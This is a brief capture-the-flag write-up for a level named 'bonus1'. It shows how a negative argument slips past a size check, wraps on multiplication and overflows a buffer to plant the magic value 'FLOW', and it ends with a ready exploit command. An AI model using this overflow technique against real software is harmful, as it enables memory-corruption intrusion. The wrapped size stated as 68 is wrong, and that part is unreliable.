we see that we memcpy av[2] into s[1] for the size of a, which is atoi(av[1] x 4) and must be < 10. a must then == 0x574f4c46. We need to overflow s1 to overwrite a.

if b = -1073741812, it is < 10 and x4 = 68, which is enough to overwrite a.

/bonus1 -1073741812 `perl -e 'print "A"x40 . "\x46\x4c\x4f\x57" . "AAAAAAAAAAAAAA"'`
